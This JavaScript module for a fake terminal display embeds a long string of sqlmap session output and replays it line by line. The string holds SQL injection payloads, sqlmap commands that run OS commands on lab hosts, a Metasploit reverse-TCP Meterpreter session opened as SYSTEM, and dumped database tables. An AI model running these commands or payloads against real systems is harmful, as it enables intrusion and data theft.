import { randomItemFromArray, randomLineRepeatedString } from "../utils";

const stream =
  "$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1\" --os-cmd id -\n\nweb application technology: PHP 5.2.6, Apache 2.2.9\nback-end DBMS: PostgreSQL\n[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system\n[hh:mm:12] [INFO] the back-end DBMS operating system is Linux\n[hh:mm:12] [INFO] testing if current user is DBA\n[hh:mm:12] [INFO] detecting back-end DBMS version from its banner\n[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist\n[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist\n[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file\n[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file\ndo you want to retrieve the command standard output? [Y/n/a] y\ncommand standard output:    'uid=104(postgres) gid=106(postgres) groups=106(post\ngres)'\n\n[hh:mm:19] [INFO] cleaning up the database management system\ndo you want to remove UDF 'sys_eval'? [Y/n] y\ndo you want to remove UDF 'sys_exec'? [Y/n] y\n[hh:mm:23] [INFO] database management system cleanup finished\n[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can on\n\n$ python sqlmap.py -u \"http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1\" --os-\n[hh:mm:31] [INFO] the back-end DBMS is MySQL\nweb server operating system: Windows 2003\nweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0\nback-end DBMS: MySQL 5.0\n[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system\n[hh:mm:31] [INFO] the back-end DBMS operating system is Windows\nhow do you want to establish the tunnel?\n[1] TCP: Metasploit Framework (default)\n[2] ICMP: icmpsh - ICMP tunneling\n> \n[hh:mm:32] [INFO] testing if current user is DBA\n[hh:mm:32] [INFO] fetching current user\nwhat is the back-end database management system architecture?\n[1] 32-bit (default)\n[2] 64-bit\n> \n[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist\n[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist\n[hh:mm:33] [INFO] detecting back-end DBMS version from its banner\n[hh:mm:33] [INFO] retrieving MySQL base directory absolute path\n[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file\n[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file\nhow do you want to execute the Metasploit shellcode on the back-end database underlying op\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)\n[2] Stand-alone payload stager (file system way)\n> \n[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode \nwhich connection type do you want to use?\n[1] Reverse TCP: Connect back from the database host to this machine (default)\n[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports \nbetween the specified and 65535\n[3] Bind TCP: Listen on the database host for a connection\n> \nwhich is the local address? [192.168.136.1] \nwhich local port number do you want to use? [60641] \nwhich payload do you want to use?\n[1] Meterpreter (default)\n[2] Shell\n[3] VNC\n> \n[hh:mm:40] [INFO] creation in progress ... done\n[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait\n       _\n                                | |      o\n_  _  _    _ _|_  __,   ,    _  | |  __    _|_\n/ |/ |/ |  |/  |  /  |  / \\_|/ \\_|/  /  \\_|  |\n|  |  |_/|__/|_/\\_/|_/ \\/ |__/ |__/\\__/ |_/|_/\n                        /|\n                        \\|\n\n    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]\n+ -- --=[ 674 exploits - 351 auxiliary\n+ -- --=[ 217 payloads - 27 encoders - 8 nops\n    =[ svn r12272 updated 4 days ago (2011.04.07)\n\nPAYLOAD => windows/meterpreter/reverse_tcp\nEXITFUNC => thread\nLPORT => 60641\nLHOST => 192.168.136.1\n[*] Started reverse handler on 192.168.136.1:60641 \n[*] Starting the payload handler...\n[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b\nineval', please wait..\n[*] Sending stage (749056 bytes) to 192.168.136.129\n[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) a\nt Mon Apr 11 hh:mm:52 +0100 2011\n\nmeterpreter > Loading extension espia...success.\nmeterpreter > Loading extension incognito...success.\nmeterpreter > [-] The 'priv' extension has already been loaded.\nmeterpreter > Loading extension sniffer...success.\nmeterpreter > System Language : en_US\nOS              : Windows .NET Server (Build 3790, Service Pack 2).\nComputer        : W2K3R2\nArchitecture    : x86\nMeterpreter     : x86/win32\nmeterpreter > Server username: NT AUTHORITY\\SYSTEM\nmeterpreter > ipconfig\n\nMS TCP Loopback interface\nHardware MAC: 00:00:00:00:00:00\nIP Address  : 127.0.0.1\nNetmask     : 255.0.0.0\n\nIntel(R) PRO/1000 MT Network Connection\nHardware MAC: 00:0c:29:fc:79:39\nIP Address  : 192.168.136.129\nNetmask     : 255.255.255.0\n\nmeterpreter > exit\n\n[*] Meterpreter session 1 closed.  Reason: User exit\n\n$ python sqlmap.py -u http://192.168.22.128/sqlmap/mysql/get_base64?value=eyJpZCI6IDF9 -v \n[23:43:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[23:43:35] [PAYLOAD] KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAx\nfScgRUxTRSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp\n[23:43:35] [TRAFFIC OUT] HTTP request [#11]:\nGET /?value=KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAxfScgRUxTR\nSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp HTTP/1.1\nHost: localhost\nCache-control: no-cache\nAccept-encoding: gzip,deflate\nAccept: */*\nUser-agent: sqlmap/1.4.4.3#dev (http://sqlmap.org)\nConnection: close\n\n$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/\" --batch --crawl=3\n[xx:xx:53] [INFO] starting crawler\n[xx:xx:53] [INFO] searching for links with depth 1\n[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while\n[xx:xx:53] [INFO] searching for links with depth 2\n[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'\n[xx:xx:00] [INFO] 42/56 links visited (75%)\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1\" -b --et\n[hh:mm:01] [INFO] the back-end DBMS is Oracle\n[hh:mm:01] [INFO] fetching banner\n[hh:mm:01] [INFO] retrieving the length of query output\n[hh:mm:01] [INFO] retrieved: 64\n17% [========>                                          ] 11/64  ETA 00:19\n\n$ python sqlmap.py --purge -v 3\n[xx:xx:55] [INFO] purging content of directory '/home/testuser/.local/share/sqlmap'...\n[xx:xx:55] [DEBUG] changing file attributes\n[xx:xx:55] [DEBUG] writing random data to files\n[xx:xx:55] [DEBUG] truncating files\n[xx:xx:55] [DEBUG] renaming filenames to random values\n[xx:xx:55] [DEBUG] renaming directory names to random values\n[xx:xx:55] [DEBUG] deleting the whole directory tree\n\n$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&use\\\nr=foo&id=1\" --batch --smart\n[xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic\n[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic\n[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might \nnot be injectable\n[xx:xx:14] [INFO] skipping GET parameter 'ca'\n[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic\n[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic\n[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' migh\nt not be injectable\n[xx:xx:14] [INFO] skipping GET parameter 'user'\n[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic\n[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic\n[xx:xx:14] [INFO] GET parameter 'id' is dynamic\n[xx:xx:14] [WARNING] reflective value(s) found and filtering out\n[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be \ninjectable (possible DBMS: 'MySQL')\n[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'\nheuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you \nwant to skip test payloads specific for other DBMSes? [Y/n] Y\ndo you want to include all tests for 'MySQL' extending provided level (1) and ri\nsk (1)? [Y/n] Y\n[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVI\nNG clause' injectable \n[xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause\n'\n[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or\n HAVING clause' injectable \n[xx:xx:14] [INFO] testing 'MySQL inline queries'\n[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'\n[xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'\n[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'\n[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' in\njectable \n[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'\n[xx:xx:24] [INFO] automatically extending ranges for UNION query injection techn\nique tests as there is at least one other potential injection technique found\n[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the \ntime needed to find the right number of query columns. Automatically extending t\nhe range for current UNION query injection technique test\n[xx:xx:24] [INFO] target URL appears to have 3 columns in query\n[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 colu\nmns' injectable\n\n\n$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1\" --b\\\natch --test-filter=ROW\n[xx:xx:39] [INFO] GET parameter 'id' is dynamic\n[xx:xx:39] [WARNING] reflective value(s) found and filtering out\n[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be \ninjectable (possible DBMS: 'MySQL')\n[xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'\n[xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause\n'\n[xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or\n HAVING clause' injectable \nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any\n)? [y/N] N\nsqlmap identified the following injection points with a total of 3 HTTP(s) reque\nsts:\n---\nPlace: GET\nParameter: id\n    Type: error-based\n    Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause\n    Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELEC\nT (C\n    ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FRO\nM (S\n    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY \nx)\n---\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --hostname\n\n[xx:xx:04] [INFO] fetching server hostname\n[xx:xx:04] [INFO] retrieved: debian-5.0-i386\nhostname:    'debian-5.0-i386'\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1\" -\\\n-columns -D testdb -T users -C name\nDatabase: SQLite_masterdb\nTable: users\n[3 columns]\n+---------+---------+\n| Column  | Type    |\n+---------+---------+\n| id      | INTEGER |\n| name    | TEXT    |\n| surname | TEXT    |\n+---------+---------+\n\n$ python sqlmap.py -u \"http://192.168.48.130/sqlmap/mysql/get_int.php?id=1\" --s\\\nchema--batch --exclude-sysdbs\n\nDatabase: owasp10\nTable: accounts\n[4 columns]\n+-------------+---------+\n| Column      | Type    |\n+-------------+---------+\n| cid         | int(11) |\n| mysignature | text    |\n| password    | text    |\n| username    | text    |\n+-------------+---------+\n\nDatabase: owasp10\nTable: blogs_table\n[4 columns]\n+--------------+----------+\n| Column       | Type     |\n+--------------+----------+\n| date         | datetime |\n| blogger_name | text     |\n| cid          | int(11)  |\n| comment      | text     |\n+--------------+----------+\n\nDatabase: owasp10\nTable: hitlog\n[6 columns]\n+----------+----------+\n| Column   | Type     |\n+----------+----------+\n| date     | datetime |\n| browser  | text     |\n| cid      | int(11)  |\n| hostname | text     |\n| ip       | text     |\n| referer  | text     |\n+----------+----------+\n\nDatabase: testdb\nTable: users\n[3 columns]\n+---------+---------------+\n| Column  | Type          |\n+---------+---------------+\n| id      | int(11)       |\n| name    | varchar(500)  |\n| surname | varchar(1000) |\n+---------+---------------+\n\n$ python sqlmap.py -u \"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1\"--count -D \n\nDatabase: testdb\n+----------------+---------+\n| Table          | Entries |\n+----------------+---------+\n| dbo.users      | 4       |\n| dbo.users_blob | 2       |\n+----------------+---------+\n\n$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1\"\\--dump -T \n\nDatabase: Firebird_masterdb\nTable: USERS\n[4 entries]\n+----+--------+------------+\n| ID | NAME   | SURNAME    |\n+----+--------+------------+\n| 1  | luther | blisset    |\n| 2  | fluffy | bunny      |\n| 3  | wu     | ming       |\n| 4  | NULL   | nameisnull |\n+----+--------+------------+\n\n";

const sqlmap = {
  numCols: 91,
  get streams() {
    return [
      {
        get title() {
          delete this.title;
          const titles = ["sqlmap", "terminal - sqlmap"];
          return (this.title = randomItemFromArray(titles));
        },

        get stream() {
          delete this.stream;
          return (this.stream = randomLineRepeatedString(stream));
        },

        get dt() {
          delete this.dt;
          return (this.dt = 91 * 7);
        },
      },
    ];
  },
};

export default sqlmap;
